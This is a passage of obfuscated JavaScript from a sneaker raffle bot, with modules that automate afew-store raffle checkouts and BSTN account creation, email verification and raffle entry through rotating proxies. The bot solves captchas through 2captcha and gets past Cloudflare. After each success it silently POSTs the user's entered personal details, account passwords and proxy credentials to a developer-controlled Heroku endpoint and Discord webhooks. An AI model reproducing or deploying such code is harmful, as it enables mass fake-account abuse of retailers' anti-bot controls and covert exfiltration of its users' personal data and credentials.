                        var _0x338535 = JSON['parse'](_0x3d3f42['readFileSync']('sizes.json', 'utf-8')), _0x4df575 = _0x168d08[_0x535be8]['Url'], _0x570297 = _0x168d08[_0x535be8]['Size'], _0x59ce67;
                        async function _0x393fda() {
                            var _0x29daff = new _0x15df56['CookieJar']();
                            console['log'](_0xed09ee() + '\x20[' + _0x5a34f8['name'] + ']\x20Task\x20' + (_0x535be8 + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x1671c1;
                            let _0x187b13 = {
                                'method': 'GET',
                                'cookieJar': _0x29daff,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x45c95f[0x2] + ':' + _0x45c95f[0x3] + '@' + _0x45c95f[0x0] + ':' + _0x45c95f[0x1]
                            }, _0x40794e = _0x4df575['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0xbd3dca = _0x40794e + '.json', _0x474e9d = await _0x3b676e(_0xbd3dca);
                            console['log'](_0xed09ee() + '\x20[' + _0x5a34f8['name'] + ']\x20Task\x20' + (_0x535be8 + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x42081e = _0x474e9d['data']['product']['variants'];
                            if (_0x570297 != 'RANDOM') {
                                if (_0x42081e[0x1]['option1']['includes']('W')) {
                                    const _0x14bcbb = _0x338535['women']['find'](_0x5c9033 => _0x5c9033['EUsize'] === _0x570297);
                                    _0x14bcbb && (_0x570297 = _0x14bcbb['size']);
                                } else {
                                    if (_0x42081e[0x1]['option1']['includes']('Y')) {
                                        const _0x54a458 = _0x338535['GS']['find'](_0xb501b => _0xb501b['EUsize'] === _0x570297);
                                        _0x54a458 && (_0x570297 = _0x54a458['size']);
                                    } else {
                                        const _0x205f33 = _0x338535['men']['find'](_0x55f7c3 => _0x55f7c3['EUsize'] === _0x570297);
                                        _0x205f33 && (_0x570297 = _0x205f33['size']);
                                    }
                                }
                                for (var _0x13c174 of _0x42081e) {
                                    _0x13c174['option1'] == _0x570297 && (_0x1671c1 = _0x13c174['id']);
                                }
                            } else {
                                var _0x5c719a = Math['round'](Math['random']() * (_0x42081e['length'] - 0x1));
                                _0x1671c1 = _0x42081e[_0x5c719a]['id'];
                            }
                            console['log'](_0xed09ee() + '\x20[' + _0x5a34f8['name'] + ']\x20Task\x20' + (_0x535be8 + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x3b676e('https://raffles.afew-store.com/cart/' + _0x1671c1 + ':1'), _0x59ce67 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x393fda();
                        } catch (_0x3e6c70) {
                            if (_0x3e6c70['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x3e6c70);
                        }
                        const _0x2dd506 = await _0x584dde['newPage']();
                        await _0x2dd506['setDefaultNavigationTimeout'](0x1d4c0), await _0x2dd506['authenticate']({
                            'username': '' + _0x45c95f[0x2],
                            'password': '' + _0x45c95f[0x3]
                        }), await _0x2dd506['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2dd506['setRequestInterception'](!![]), _0x2dd506['on']('request', _0x675005 => {
                            _0x675005['resourceType']() === 'image' || _0x675005['resourceType']() === 'font' || _0x675005['resourceType']() === 'media' ? _0x675005['abort']() : _0x675005['continue']();
                        });
                        try {
                            await _0x2dd506['goto'](_0x59ce67, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0xed09ee() + '\x20[' + _0x5a34f8['name'] + ']\x20Task\x20' + (_0x535be8 + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x2dd506['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2dd506['type']('#checkout_email', '' + _0x168d08[_0x535be8]['Email']), await _0x572e60(0x320), await _0x2dd506['type']('#checkout_attributes_instagram', '' + _0x168d08[_0x535be8]['Follower']), await _0x572e60(0x320), await _0x2dd506['select']('#checkout_shipping_address_country', '' + _0x168d08[_0x535be8]['Country']), await _0x2dd506['waitForTimeout'](0x258), await _0x2dd506['type']('#checkout_shipping_address_first_name', '' + _0x168d08[_0x535be8]['FirstName']), await _0x2dd506['waitForTimeout'](0x320), await _0x2dd506['type']('#checkout_shipping_address_last_name', '' + _0x168d08[_0x535be8]['LastName']), await _0x2dd506['waitForTimeout'](0x2bc), await _0x2dd506['type']('#checkout_shipping_address_address1', _0x168d08[_0x535be8]['Address1'] + '\x20' + _0x168d08[_0x535be8]['HouseNumber']), await _0x2dd506['waitForTimeout'](0x2bc), await _0x2dd506['type']('#checkout_shipping_address_address2', '' + _0x168d08[_0x535be8]['Address2']), await _0x2dd506['waitForTimeout'](0x2bc), await _0x2dd506['type']('#checkout_shipping_address_zip', '' + _0x168d08[_0x535be8]['Zip']), await _0x2dd506['waitForTimeout'](0x2bc), await _0x2dd506['type']('#checkout_shipping_address_city', '' + _0x168d08[_0x535be8]['City']), await _0x2dd506['waitForTimeout'](0x2bc);
                        if (_0x168d08[_0x535be8]['State'] != '')
                            try {
                                const _0x5d2217 = JSON['parse'](_0x3d3f42['readFileSync']('States.json', 'utf8'));
                                await _0x572e60(0x1f4);
                                if (_0x168d08[_0x535be8]['State']['length'] > 0x2)
                                    for (let _0x1430d5 of _0x5d2217) {
                                        if (_0x1430d5['Province'] == _0x168d08[_0x535be8]['State']) {
                                            await _0x2dd506['select']('#checkout_shipping_address_province', _0x1430d5['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x2dd506['select']('#checkout_shipping_address_province', _0x168d08[_0x535be8]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x572e60(0x1f4), console['log'](_0xed09ee() + '\x20[' + _0x5a34f8['name'] + ']\x20Task\x20' + (_0x535be8 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x572e60(0x190), _0x2dd506['evaluate'](() => {
                            const _0x4a54c0 = document['querySelector']('#continue_button');
                            for (var _0x212343 = 0x0; _0x212343 < 0x5; _0x212343++) {
                                if (_0x4a54c0) {
                                    _0x4a54c0['click'](), _0x4a54c0['click']();
                                    break;
                                } else
                                    _0x572e60(0xfa0);
                            }
                        }), await _0x2dd506['waitForTimeout'](0x9c4);
                        try {
                            await _0x2dd506['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x2dd506['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x1d02ee => _0x1d02ee['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2dd506['waitForTimeout'](0x7d0), console['log'](_0xed09ee() + '\x20[' + _0x5a34f8['name'] + ']\x20Task\x20' + (_0x535be8 + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x2dd506['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x572e60(0x3e8), await _0x2dd506['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x5add24 => _0x5add24['submit']()), await _0x572e60(0x3e8);
                        try {
                            await _0x2dd506['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2dd506['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x1d2614 => _0x1d2614['submit']());
                        try {
                            await _0x2dd506['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x4dfb27 = 'no', _0x14aa55(_0x168d08[_0x535be8], _0x5a34f8), console['log'](_0x2d77f8['green'](_0xed09ee() + '\x20[' + _0x5a34f8['name'] + ']\x20Task\x20' + (_0x535be8 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x114346['webhook'] != undefined && _0x114346['webhook'] != '')
                                try {
                                    await _0x5641c6(_0x114346['webhook'], _0x21ca58['succesDEVMSG']);
                                } catch {
                                }
                            await _0x572e60(0xc8), await _0x5641c6(_0x1543f5, _0x21ca58['succesDEVMSG']), await _0x572e60(0xc8);
                            try {
                                await _0x5641c6(_0x30beeb, _0x21ca58['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x447b4a['replace']('#', ''),
                                    'module': _0x5a34f8['name'],
                                    'entrydata': JSON['stringify'](_0x3221af),
                                    'proxy': '' + _0x30249e[_0x535be8]
                                };
                                var _0x184a3f = JSON['stringify'](prxdata);
                                let _0x169f6f = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3b676e['post']('https://jraffles.herokuapp.com/success', _0x184a3f, _0x169f6f);
                            } catch (_0x29e4af) {
                            }
                        } catch (_0x219d4a) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x37e1de) {
                        _0x37e1de['message']['includes']('selector') && (_0x37e1de = 'Connection\x20Error');
                        console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x5a34f8['name'] + ']\x20Task\x20' + (_0x535be8 + 0x1) + '\x20:\x20' + _0x37e1de)), _0x49e910 = '' + _0x37e1de;
                        var _0x296074 = await _0x254487(_0x168d08[_0x535be8], _0x5a34f8, 'dev', !![], _0x49e910);
                        _0x21ca58['errorDEV'] = { 'embeds': [_0x296074] }, _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x21ca58['errorDEV']), await _0x5641c6(_0x188004, _0x21ca58['errorDEV']), _0x4dfb27 = 'yes';
                    } finally {
                        _0x584dde && _0x584dde['close']();
                        if (_0x4dfb27 == 'yes' && _0xe741a5 != 0x5 && _0x49e910 != 'Size\x20Not\x20Found') {
                            console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x5a34f8['name'] + ']\x20Task\x20' + (_0x535be8 + 0x1) + '\x20:\x20Retrying\x20(' + _0xe741a5 + '\x20/\x205)')), _0x535be8 = _0x535be8 - 0x1, _0xe741a5 = _0xe741a5 + 0x1;
                            continue;
                        }
                        _0x4dfb27 == 'yes' && _0xe741a5 >= 0x5 && (_0x58f6f1(_0x168d08[_0x535be8], _0x5a34f8), _0x4dfb27 = 'no', _0xe741a5 = 0x0);
                        if (_0x535be8 + 0x1 == _0x168d08['length']) {
                            await _0x572e60(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x114346['AfewDelay'] + '\x20ms'), await _0x572e60(_0x114346['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x29deb2, _0x42b8ec, _0x2d1edb) {
                    var _0x37a2ef = _0x42b8ec, _0x210482 = 0x0;
                    for (var _0x5a838d = 0x0; _0x5a838d < _0x42b8ec['length']; _0x5a838d++) {
                        maxTasks = Number(_0x114346['threads']);
                        while (_0x210482 >= maxTasks) {
                            await _0x572e60(_0x114346['delay']);
                        }
                        async function _0x4ae9f5(_0x18e198, _0xf63d79, _0x704c89, _0x223355) {
                            _0x210482++, _0x5dd90e['use'](_0x118712()), _0x5dd90e['use'](_0x1e1820({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x114346['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x3285b3 != 'yes')
                                var _0x3285b3 = '', _0x176b8a = 0x0;
                            var _0x4be540;
                            try {
                                await _0x44ca58(_0xf63d79, _0x223355);
                            } catch {
                                _0x3285b3 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x59687e(_0x18e198['name'] + '\x20Task\x20' + (_0x223355 + 0x1) + '\x20/\x20' + _0xf63d79['length'] + '\x20||\x20File:\x20' + _0x2b0c3a + '\x20Proxies:\x20' + _0x5e9a1f);
                            var _0x3ea0aa = await _0x254487(_0xf63d79[_0x223355], _0x18e198, 'acc', ![]);
                            const _0x25db85 = { 'succesDEVMSG': { 'embeds': [_0x3ea0aa] } }, _0x31adeb = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x21fa46 = Math['round'](Math['random']() * (_0x704c89['length'] - 0x1)), _0x300045 = _0x704c89[_0x21fa46]['split'](':'), _0x5127bf;
                            try {
                                _0x5127bf = await _0x5dd90e['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x300045[0x0] + ':' + _0x300045[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x5127bf = await _0x5dd90e['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x300045[0x0] + ':' + _0x300045[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x300c43 = await _0x5127bf['newPage']();
                                await _0x300c43['authenticate']({
                                    'username': '' + _0x300045[0x2],
                                    'password': '' + _0x300045[0x3]
                                }), console['log'](_0xed09ee() + '\x20[' + _0x18e198['name'] + ']\x20Task\x20' + (_0x223355 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x300c43['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x300c43['setRequestInterception'](!![]), _0x300c43['on']('request', _0x23632b => {
                                    _0x23632b['resourceType']() === 'image' ? _0x23632b['abort']() : _0x23632b['continue']();
                                });
                                try {
                                    await _0x300c43['goto']('' + _0x31adeb), await _0x300c43['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    _0x3285b3 = 'yes';
                                    throw new Error('Proxy\x20Error');
                                }
                                await _0x300c43['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0xed09ee() + '\x20[' + _0x18e198['name'] + ']\x20Task\x20' + (_0x223355 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x572e60(0x7d0), console['log'](_0xed09ee() + '\x20[' + _0x18e198['name'] + ']\x20Task\x20' + (_0x223355 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x572e60(0x190), await _0x300c43['waitForSelector']('#firstname'), await _0x300c43['type']('#firstname', _0xf63d79[_0x223355]['FirstName'], { 'delay': 0xf0 }), await _0x572e60(0x190), await _0x300c43['type']('#lastname', _0xf63d79[_0x223355]['LastName'], { 'delay': 0xe6 }), await _0x572e60(0x190), await _0x300c43['type']('#email_address', _0xf63d79[_0x223355]['Email'], { 'delay': 0x122 }), await _0x572e60(0x190), await _0x300c43['type']('#password', _0xf63d79[_0x223355]['Password'], { 'delay': 0x82 }), await _0x572e60(0x1f4), await _0x300c43['type']('#password-confirmation', _0xf63d79[_0x223355]['Password'], { 'delay': 0x7c }), console['log'](_0xed09ee() + '\x20[' + _0x18e198['name'] + ']\x20Task\x20' + (_0x223355 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x572e60(0x2bc), await _0x300c43['$eval']('#form-validate', _0x40340c => _0x40340c['submit']()), await _0x572e60(0x1388);
                                const _0x48bb83 = await _0x300c43['$']('#email_address-error');
                                if (_0x48bb83)
                                    throw new Error('Invalid\x20Email');
                                const _0xdfa399 = await _0x300c43['$']('#password-error');
                                if (_0xdfa399)
                                    throw new Error('Invalid\x20Password');
                                await _0x300c43['waitForSelector']('div.mesg-success'), _0x3285b3 = 'no', console['log'](_0x2d77f8['green'](_0xed09ee() + '\x20[' + _0x18e198['name'] + ']\x20Task\x20' + (_0x223355 + 0x1) + '\x20:\x20Account\x20' + _0xf63d79[_0x223355]['Email'] + '\x20Generated')), _0x3d3f42['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0xf63d79[_0x223355]['Email'] + ',' + _0xf63d79[_0x223355]['Password']);
                                try {
                                    _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x25db85['succesDEVMSG']);
                                } catch {
                                }
                                await _0x5641c6(_0x34385d, _0x25db85['succesDEVMSG']);
                                let _0x210f71 = _0xf63d79[_0x223355];
                                try {
                                    prxdata = {
                                        'username': _0x447b4a['replace']('#', ''),
                                        'module': _0x18e198['name'],
                                        'entrydata': JSON['stringify'](_0x210f71),
                                        'proxy': '' + _0x704c89[_0x223355]
                                    };
                                    var _0x2800eb = JSON['stringify'](prxdata);
                                    let _0x500b12 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3b676e['post']('https://jraffles.herokuapp.com/success', _0x2800eb, _0x500b12);
                                } catch (_0x5089f2) {
                                }
                                console['log'](_0x2d77f8['yellow'](_0xed09ee() + '\x20[' + _0x18e198['name'] + ']\x20Task\x20' + (_0x223355 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                            } catch (_0x3ca291) {
                                console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x18e198['name'] + ']\x20Task\x20' + (_0x223355 + 0x1) + '\x20:\x20' + _0x3ca291)), _0x4be540 = '' + _0x3ca291;
                                var _0x1d0840 = await _0x254487(_0xf63d79[_0x223355], _0x18e198, 'acc', !![], _0x4be540);
                                _0x25db85['errorDEV'] = { 'embeds': [_0x1d0840] }, _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x25db85['errorDEV']), await _0x5641c6(_0x188004, _0x25db85['errorDEV']), _0x3285b3 = 'yes';
                            } finally {
                                if (_0x5127bf)
                                    _0x5127bf['close']();
                                if (_0x3285b3 == 'yes' && _0x176b8a != 0x5)
                                    return console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x18e198['name'] + ']\x20Task\x20' + (_0x223355 + 0x1) + '\x20:\x20Retrying\x20(' + _0x176b8a + '\x20/\x205)')), _0x176b8a = _0x176b8a + 0x1, _0xf63d79(_0x18e198, _0xf63d79, _0x704c89, _0x223355);
                                _0x3285b3 == 'yes' && _0x176b8a >= 0x5 && (_0x58f6f1(_0xf63d79[_0x223355], _0x18e198), _0x3285b3 = 'no', _0x176b8a = 0x0), _0x210482--, console['log'](_0xed09ee() + '\x20[' + _0x18e198['name'] + ']\x20Waiting\x20for\x20' + _0x114346['delay'] + '\x20ms'), await _0x572e60(_0x114346['delay']);
                            }
                        }
                        _0x4ae9f5(_0x29deb2, _0x37a2ef, _0x2d1edb, _0x5a838d), await _0x572e60(_0x114346['delay']);
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x4090c9, _0x2136a7) {
                    var _0x25ab30 = ![], _0x2f6861 = [];
                    async function _0xc00ed3() {
                        var _0x2d41df = new _0x266969({
                            'user': _0x114346['masterMail'],
                            'password': _0x114346['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x340ea2(_0x1aef7e) {
                            _0x2d41df['openBox']('INBOX', ![], _0x1aef7e);
                        }
                        _0x2d41df['once']('ready', function () {
                            _0x340ea2(function (_0x26fa2e, _0x10ad6f) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x26fa2e)
                                    throw _0x26fa2e;
                                _0x2d41df['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x5198bd, _0x2750db) {
                                    if (!_0x2750db || !_0x2750db['length'])
                                        console['log'](_0xed09ee() + '\x20[' + _0x4090c9['name'] + ']\x20No\x20mails\x20found'), _0x2d41df['end']();
                                    else {
                                        var _0x5977f6 = _0x2d41df['seq']['fetch'](_0x2750db, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x5977f6['on']('message', function (_0xc8848d, _0x5425ac) {
                                            var _0x29c05d = '(#' + _0x5425ac + ')\x20';
                                            _0xc8848d['on']('body', function (_0x513cfa, _0x4eb57a) {
                                                _0x172805(_0x513cfa, (_0x1ad114, _0x20a36b) => {
                                                    var _0x3196bf = _0x20a36b['text']['split']('customer/account/confirm/')[0x1], _0xf3b217 = _0x3196bf['split'](']')[0x0];
                                                    _0x2f6861['push']('https://www.bstn.com/eu_en/customer/account/confirm/' + _0xf3b217);
                                                });
                                            }), _0xc8848d['once']('end', function () {
                                            });
                                        }), _0x5977f6['once']('error', function (_0x331139) {
                                            console['log']('Fetch\x20error:\x20' + _0x331139), _0x25ab30 = !![];
                                        }), _0x5977f6['once']('end', function () {
                                            _0x2d41df['end'](), _0x25ab30 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x2d41df['once']('error', function (_0x2bd861) {
                            console['log'](_0x2d77f8['red'](_0x2bd861['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x25ab30 = !![];
                        }), _0x2d41df['once']('end', async function () {
                            _0x25ab30 = !![];
                        }), _0x2d41df['connect']();
                    }
                    async function _0x416844(_0x385636, _0x50042c, _0x240bf5) {
                        _0x5dd90e['use'](_0x118712());
                        for (var _0x21b911 = 0x0; _0x21b911 < _0x50042c['length']; _0x21b911++) {
                            if (_0x543952 != 'yes')
                                var _0x543952 = '', _0x3d0b7d = 0x0;
                            var _0x283d14 = Math['round'](Math['random']() * (_0x240bf5['length'] - 0x1)), _0x450289 = _0x240bf5[_0x283d14]['split'](':'), _0x435219;
                            try {
                                _0x435219 = await _0x5dd90e['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x450289[0x0] + ':' + _0x450289[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x435219 = await _0x5dd90e['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x450289[0x0] + ':' + _0x450289[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x43f8b9 = await _0x435219['newPage']();
                                await _0x43f8b9['authenticate']({
                                    'username': '' + _0x450289[0x2],
                                    'password': '' + _0x450289[0x3]
                                }), console['log'](_0xed09ee() + '\x20[' + _0x385636['name'] + ']\x20Task\x20' + (_0x21b911 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x43f8b9['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x43f8b9['setRequestInterception'](!![]), _0x43f8b9['on']('request', _0x40e393 => {
                                    _0x40e393['resourceType']() === 'image' || _0x40e393['resourceType']() === 'font' || _0x40e393['resourceType']() === 'media' ? _0x40e393['abort']() : _0x40e393['continue']();
                                }), console['log'](_0xed09ee() + '\x20[' + _0x385636['name'] + ']\x20Task\x20' + (_0x21b911 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x43f8b9['goto'](_0x50042c[_0x21b911]);
                                } catch (_0x3044bd) {
                                    _0x543952 = 'yes';
                                    throw new Error('\x27Connection\x20Error\x27\x20' + _0x3044bd);
                                }
                                console['log'](_0xed09ee() + '\x20[' + _0x385636['name'] + ']\x20Task\x20' + (_0x21b911 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x43f8b9['waitForTimeout'](0xbb8);
                                try {
                                    await _0x43f8b9['waitForSelector']('.account-nav'), _0x543952 = 'no', console['log'](_0x2d77f8['green'](_0xed09ee() + '\x20[' + _0x385636['name'] + ']\x20Task\x20' + (_0x21b911 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x2567c0 = await _0x254487(null, _0x385636, 'ver', ![]);
                                    const _0xddb2d4 = { 'succesDEVMSG': { 'embeds': [_0x2567c0] } };
                                    await _0x5641c6(_0x1ea2ad, _0xddb2d4['succesDEVMSG']);
                                } catch {
                                    _0x543952 = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x1e536b) {
                                console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x385636['name'] + ']\x20Task\x20' + (_0x21b911 + 0x1) + '\x20:\x20' + _0x1e536b));
                                var _0x1c2a4e = _0x1e536b, _0x42e500 = await _0x254487(null, _0x385636, 'ver', !![], _0x1c2a4e);
                                const _0x24a54e = { 'errorDEVMSG': { 'embeds': [_0x42e500] } };
                                _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x24a54e['errorDEVMSG']), await _0x5641c6(_0x188004, _0x24a54e['errorDEVMSG']);
                            } finally {
                                _0x435219['close']();
                                if (_0x543952 == 'yes' && _0x3d0b7d != 0x5) {
                                    console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x385636['name'] + ']\x20Task\x20' + (_0x21b911 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3d0b7d + '\x20/\x205)')), _0x21b911 = _0x21b911 - 0x1, _0x3d0b7d = _0x3d0b7d + 0x1;
                                    continue;
                                }
                                _0x543952 == 'yes' && _0x3d0b7d >= 0x5 && (_0x543952 = 'no', _0x3d0b7d = 0x0), console['log'](_0xed09ee() + '\x20[' + _0x385636['name'] + ']\x20Waiting\x20for\x20' + _0x114346['delay'] + '\x20ms'), await _0x572e60(_0x114346['delay']);
                            }
                        }
                    }
                    try {
                        _0xc00ed3();
                        while (!_0x25ab30) {
                            await _0x572e60(0xfa0);
                        }
                        console['log']('Found\x20' + _0x2f6861['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x572e60(0x7d0);
                    }
                    await _0x416844(_0x4090c9, _0x2f6861, _0x2136a7);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0xaad8c0, _0x33b865, _0x5c2069) {
                    _0x5dd90e['use'](_0x118712()), _0x5dd90e['use'](_0x1e1820({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x114346['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xe1a6a = 0x0; _0xe1a6a < _0x33b865['length']; _0xe1a6a++) {
                        var _0x1142b8, _0x2eade7 = _0x33b865[_0xe1a6a];
                        try {
                            await _0x44ca58(_0x33b865, _0xe1a6a);
                        } catch {
                            _0x1c0296 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x4fb82b(_0x55d590) {
                            const _0x3c6e4e = _0x3d3f42['readFileSync']('../successful-tasks.csv', 'utf8'), _0x13201c = _0x365ef0['parse'](_0x3c6e4e, { 'header': !![] })['data'];
                            let _0x3eb219 = ![];
                            for (var _0x41e296 of _0x13201c) {
                                if (_0x41e296['Url'] == _0x55d590['Url'] && _0x41e296['Email'] == _0x55d590['Email']) {
                                    _0x3eb219 = !![];
                                    break;
                                }
                            }
                            return _0x3eb219;
                        }
                        if (await _0x4fb82b(_0x33b865[_0xe1a6a]) == !![]) {
                            console['log'](_0xed09ee() + '\x20[' + _0xaad8c0['name'] + ']\x20Task\x20' + (_0xe1a6a + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                            continue;
                        }
                        if (_0x1c0296 != 'yes')
                            var _0x1c0296 = '', _0x447b9c = 0x0;
